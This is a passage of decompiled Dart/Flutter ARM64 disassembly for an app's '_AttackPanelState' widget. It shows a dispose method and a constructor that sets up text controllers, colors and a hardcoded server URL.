    // 0x980e8c: branchIfSmi(r0, 0x980e98)
    //     0x980e8c: tbz             w0, #0, #0x980e98
    // 0x980e90: r4 = LoadClassIdInstr(r0)
    //     0x980e90: ldur            x4, [x0, #-1]
    //     0x980e94: ubfx            x4, x4, #0xc, #0x14
    // 0x980e98: sub             x4, x4, #0x5e
    // 0x980e9c: cmp             x4, #1
    // 0x980ea0: b.ls            #0x980eb4
    // 0x980ea4: r8 = String
    //     0x980ea4: ldr             x8, [PP, #0x238]  ; [pp+0x238] Type: String
    // 0x980ea8: r3 = Null
    //     0x980ea8: add             x3, PP, #0x41, lsl #12  ; [pp+0x410a0] Null
    //     0x980eac: ldr             x3, [x3, #0xa0]
    // 0x980eb0: r0 = String()
    //     0x980eb0: bl              #0xbfe1d8  ; IsType_String_Stub
    // 0x980eb4: ldur            x0, [fp, #-0x10]
    // 0x980eb8: ldur            x1, [fp, #-8]
    // 0x980ebc: StoreField: r1->field_2b = r0
    //     0x980ebc: stur            w0, [x1, #0x2b]
    //     0x980ec0: ldurb           w16, [x1, #-1]
    //     0x980ec4: ldurb           w17, [x0, #-1]
    //     0x980ec8: and             x16, x17, x16, lsr #2
    //     0x980ecc: tst             x16, HEAP, lsr #32
    //     0x980ed0: b.eq            #0x980ed8
    //     0x980ed4: bl              #0xbf6234  ; WriteBarrierWrappersStub
    // 0x980ed8: r0 = Null
    //     0x980ed8: mov             x0, NULL
    // 0x980edc: LeaveFrame
    //     0x980edc: mov             SP, fp
    //     0x980ee0: ldp             fp, lr, [SP], #0x10
    // 0x980ee4: ret
    //     0x980ee4: ret             
    // 0x980ee8: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x980ee8: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x980eec: b               #0x980db0
    // 0x980ef0: r0 = NullCastErrorSharedWithoutFPURegs()
    //     0x980ef0: bl              #0xbf8364  ; NullCastErrorSharedWithoutFPURegsStub
    // 0x980ef4: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x980ef4: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
  }
  _ dispose(/* No info */) {
    // ** addr: 0x9ac2c4, size: 0x84
    // 0x9ac2c4: EnterFrame
    //     0x9ac2c4: stp             fp, lr, [SP, #-0x10]!
    //     0x9ac2c8: mov             fp, SP
    // 0x9ac2cc: AllocStack(0x8)
    //     0x9ac2cc: sub             SP, SP, #8
    // 0x9ac2d0: SetupParameters(_AttackPanelState this /* r1 => r0, fp-0x8 */)
    //     0x9ac2d0: mov             x0, x1
    //     0x9ac2d4: stur            x1, [fp, #-8]
    // 0x9ac2d8: CheckStackOverflow
    //     0x9ac2d8: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x9ac2dc: cmp             SP, x16
    //     0x9ac2e0: b.ls            #0x9ac334
    // 0x9ac2e4: LoadField: r1 = r0->field_27
    //     0x9ac2e4: ldur            w1, [x0, #0x27]
    // 0x9ac2e8: DecompressPointer r1
    //     0x9ac2e8: add             x1, x1, HEAP, lsl #32
    // 0x9ac2ec: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x9ac2f0: cmp             w1, w16
    // 0x9ac2f4: b.eq            #0x9ac33c
    // 0x9ac2f8: r0 = dispose()
    //     0x9ac2f8: bl              #0x5826bc  ; [package:flutter/src/animation/animation_controller.dart] AnimationController::dispose
    // 0x9ac2fc: ldur            x0, [fp, #-8]
    // 0x9ac300: LoadField: r1 = r0->field_1b
    //     0x9ac300: ldur            w1, [x0, #0x1b]
    // 0x9ac304: DecompressPointer r1
    //     0x9ac304: add             x1, x1, HEAP, lsl #32
    // 0x9ac308: r0 = dispose()
    //     0x9ac308: bl              #0x9f5028  ; [package:flutter/src/foundation/change_notifier.dart] ChangeNotifier::dispose
    // 0x9ac30c: ldur            x0, [fp, #-8]
    // 0x9ac310: LoadField: r1 = r0->field_1f
    //     0x9ac310: ldur            w1, [x0, #0x1f]
    // 0x9ac314: DecompressPointer r1
    //     0x9ac314: add             x1, x1, HEAP, lsl #32
    // 0x9ac318: r0 = dispose()
    //     0x9ac318: bl              #0x9f5028  ; [package:flutter/src/foundation/change_notifier.dart] ChangeNotifier::dispose
    // 0x9ac31c: ldur            x1, [fp, #-8]
    // 0x9ac320: r0 = dispose()
    //     0x9ac320: bl              #0x9ac348  ; [dart:mixin_deduplication] _MixinApplication283&State&TickerProviderStateMixin::dispose
    // 0x9ac324: r0 = Null
    //     0x9ac324: mov             x0, NULL
    // 0x9ac328: LeaveFrame
    //     0x9ac328: mov             SP, fp
    //     0x9ac32c: ldp             fp, lr, [SP], #0x10
    // 0x9ac330: ret
    //     0x9ac330: ret             
    // 0x9ac334: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x9ac334: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x9ac338: b               #0x9ac2e4
    // 0x9ac33c: r9 = _controller
    //     0x9ac33c: add             x9, PP, #0x40, lsl #12  ; [pp+0x40ed0] Field <_AttackPanelState@230213185._controller@230213185>: late (offset: 0x28)
    //     0x9ac340: ldr             x9, [x9, #0xed0]
    // 0x9ac344: r0 = LateInitializationErrorSharedWithoutFPURegs()
    //     0x9ac344: bl              #0xbf85ec  ; LateInitializationErrorSharedWithoutFPURegsStub
  }
  _ _AttackPanelState(/* No info */) {
    // ** addr: 0x9e15c4, size: 0x14c
    // 0x9e15c4: EnterFrame
    //     0x9e15c4: stp             fp, lr, [SP, #-0x10]!
    //     0x9e15c8: mov             fp, SP
    // 0x9e15cc: AllocStack(0x10)
    //     0x9e15cc: sub             SP, SP, #0x10
    // 0x9e15d0: r6 = "http://superdexapp.queen-official.com:2013"
    //     0x9e15d0: add             x6, PP, #0x11, lsl #12  ; [pp+0x11a18] "http://superdexapp.queen-official.com:2013"
    //     0x9e15d4: ldr             x6, [x6, #0xa18]
    // 0x9e15d8: ldr             x5, [THR, #0x90]  ; THR::object_sentinel
    // 0x9e15dc: r4 = ""
    //     0x9e15dc: ldr             x4, [PP, #0x148]  ; [pp+0x148] ""
    // 0x9e15e0: r3 = Instance_Color
    //     0x9e15e0: add             x3, PP, #0x32, lsl #12  ; [pp+0x32f98] Obj!Color@a11431
    //     0x9e15e4: ldr             x3, [x3, #0xf98]
    // 0x9e15e8: r2 = Instance_Color
    //     0x9e15e8: add             x2, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x9e15ec: ldr             x2, [x2, #0xf80]
    // 0x9e15f0: r0 = Instance_Color
    //     0x9e15f0: add             x0, PP, #0x32, lsl #12  ; [pp+0x32fa0] Obj!Color@a11491
    //     0x9e15f4: ldr             x0, [x0, #0xfa0]
    // 0x9e15f8: d0 = 60.000000
    //     0x9e15f8: add             x17, PP, #0xc, lsl #12  ; [pp+0xc278] IMM: double(60) from 0x404e000000000000
    //     0x9e15fc: ldr             d0, [x17, #0x278]
    // 0x9e1600: mov             x7, x1
    // 0x9e1604: stur            x1, [fp, #-8]
    // 0x9e1608: CheckStackOverflow
    //     0x9e1608: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x9e160c: cmp             SP, x16
    //     0x9e1610: b.ls            #0x9e1708
    // 0x9e1614: StoreField: r7->field_23 = r6
    //     0x9e1614: stur            w6, [x7, #0x23]
    // 0x9e1618: StoreField: r7->field_27 = r5
    //     0x9e1618: stur            w5, [x7, #0x27]
    // 0x9e161c: StoreField: r7->field_2b = r4
    //     0x9e161c: stur            w4, [x7, #0x2b]
    // 0x9e1620: StoreField: r7->field_2f = d0
    //     0x9e1620: stur            d0, [x7, #0x2f]
    // 0x9e1624: StoreField: r7->field_37 = r3
    //     0x9e1624: stur            w3, [x7, #0x37]
    // 0x9e1628: StoreField: r7->field_3f = r2
    //     0x9e1628: stur            w2, [x7, #0x3f]
    // 0x9e162c: StoreField: r7->field_43 = r0
    //     0x9e162c: stur            w0, [x7, #0x43]
    // 0x9e1630: r1 = <TextEditingValue>
    //     0x9e1630: ldr             x1, [PP, #0x50e8]  ; [pp+0x50e8] TypeArguments: <TextEditingValue>
    // 0x9e1634: r0 = TextEditingController()
    //     0x9e1634: bl              #0x7952a4  ; AllocateTextEditingControllerStub -> TextEditingController (size=0x2c)
    // 0x9e1638: mov             x1, x0
    // 0x9e163c: stur            x0, [fp, #-0x10]
    // 0x9e1640: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x9e1640: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x9e1644: r0 = TextEditingController()
    //     0x9e1644: bl              #0x697534  ; [package:flutter/src/widgets/editable_text.dart] TextEditingController::TextEditingController
    // 0x9e1648: ldur            x0, [fp, #-0x10]
    // 0x9e164c: ldur            x2, [fp, #-8]
    // 0x9e1650: StoreField: r2->field_1b = r0
    //     0x9e1650: stur            w0, [x2, #0x1b]
    //     0x9e1654: ldurb           w16, [x2, #-1]
    //     0x9e1658: ldurb           w17, [x0, #-1]
    //     0x9e165c: and             x16, x17, x16, lsr #2
    //     0x9e1660: tst             x16, HEAP, lsr #32
    //     0x9e1664: b.eq            #0x9e166c
    //     0x9e1668: bl              #0xbf6254  ; WriteBarrierWrappersStub
    // 0x9e166c: r1 = <TextEditingValue>
    //     0x9e166c: ldr             x1, [PP, #0x50e8]  ; [pp+0x50e8] TypeArguments: <TextEditingValue>
    // 0x9e1670: r0 = TextEditingController()
    //     0x9e1670: bl              #0x7952a4  ; AllocateTextEditingControllerStub -> TextEditingController (size=0x2c)
    // 0x9e1674: mov             x1, x0
    // 0x9e1678: stur            x0, [fp, #-0x10]
    // 0x9e167c: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x9e167c: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x9e1680: r0 = TextEditingController()
    //     0x9e1680: bl              #0x697534  ; [package:flutter/src/widgets/editable_text.dart] TextEditingController::TextEditingController
    // 0x9e1684: ldur            x0, [fp, #-0x10]
    // 0x9e1688: ldur            x1, [fp, #-8]
    // 0x9e168c: StoreField: r1->field_1f = r0
    //     0x9e168c: stur            w0, [x1, #0x1f]
    //     0x9e1690: ldurb           w16, [x1, #-1]
    //     0x9e1694: ldurb           w17, [x0, #-1]
    //     0x9e1698: and             x16, x17, x16, lsr #2
    //     0x9e169c: tst             x16, HEAP, lsr #32
    //     0x9e16a0: b.eq            #0x9e16a8
    //     0x9e16a4: bl              #0xbf6234  ; WriteBarrierWrappersStub
    // 0x9e16a8: r0 = Color()
    //     0x9e16a8: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x9e16ac: r1 = Instance_ColorSpace
    //     0x9e16ac: ldr             x1, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x9e16b0: StoreField: r0->field_27 = r1
    //     0x9e16b0: stur            w1, [x0, #0x27]
    // 0x9e16b4: d0 = 0.866667
    //     0x9e16b4: add             x17, PP, #0xb, lsl #12  ; [pp+0xb870] IMM: double(0.8666666666666667) from 0x3febbbbbbbbbbbbc
    //     0x9e16b8: ldr             d0, [x17, #0x870]
    // 0x9e16bc: StoreField: r0->field_7 = d0
    //     0x9e16bc: stur            d0, [x0, #7]
    // 0x9e16c0: d0 = 0.101961
    //     0x9e16c0: ldr             d0, [PP, #0x6f30]  ; [pp+0x6f30] IMM: double(0.10196078431372549) from 0x3fba1a1a1a1a1a1a
    // 0x9e16c4: StoreField: r0->field_f = d0
    //     0x9e16c4: stur            d0, [x0, #0xf]
    // 0x9e16c8: d0 = 0.047059
    //     0x9e16c8: add             x17, PP, #0xc, lsl #12  ; [pp+0xcee0] IMM: double(0.047058823529411764) from 0x3fa8181818181818
    //     0x9e16cc: ldr             d0, [x17, #0xee0]
    // 0x9e16d0: ArrayStore: r0[0] = d0  ; List_8
    //     0x9e16d0: stur            d0, [x0, #0x17]
    // 0x9e16d4: StoreField: r0->field_1f = d0
    //     0x9e16d4: stur            d0, [x0, #0x1f]
    // 0x9e16d8: ldur            x1, [fp, #-8]
    // 0x9e16dc: StoreField: r1->field_3b = r0
    //     0x9e16dc: stur            w0, [x1, #0x3b]
    //     0x9e16e0: ldurb           w16, [x1, #-1]
    //     0x9e16e4: ldurb           w17, [x0, #-1]
    //     0x9e16e8: and             x16, x17, x16, lsr #2
    //     0x9e16ec: tst             x16, HEAP, lsr #32
    //     0x9e16f0: b.eq            #0x9e16f8
    //     0x9e16f4: bl              #0xbf6234  ; WriteBarrierWrappersStub
    // 0x9e16f8: r0 = Null
    //     0x9e16f8: mov             x0, NULL
    // 0x9e16fc: LeaveFrame
    //     0x9e16fc: mov             SP, fp
    //     0x9e1700: ldp             fp, lr, [SP], #0x10
    // 0x9e1704: ret
    //     0x9e1704: ret             
    // 0x9e1708: r0 = StackOverflowSharedWithFPURegs()
    //     0x9e1708: bl              #0xbf7d54  ; StackOverflowSharedWithFPURegsStub
    // 0x9e170c: b               #0x9e1614
  }
}
